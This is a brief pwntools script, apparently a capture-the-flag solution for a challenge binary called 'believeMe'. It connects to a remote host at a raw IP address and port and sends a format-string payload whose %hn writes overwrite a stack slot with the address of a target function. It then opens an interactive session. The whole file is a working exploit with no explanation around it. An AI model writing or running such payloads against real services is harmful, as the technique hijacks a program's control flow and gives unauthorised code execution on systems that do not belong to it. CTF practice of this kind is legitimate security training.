from pwn import *
#context.log_level="debug"
#p=process("./believeMe")
p=remote("18.223.228.52",13337)
p.readuntil("????")
nox=0x804867b
stack=0xffffdd30-0x4
payload=p32(stack)+p32(stack+2)+"%034419c"+"%9$hn"+"%033161c"+"%10$hn"
assert(len(payload)<39)
p.send(payload)
p.interactive()

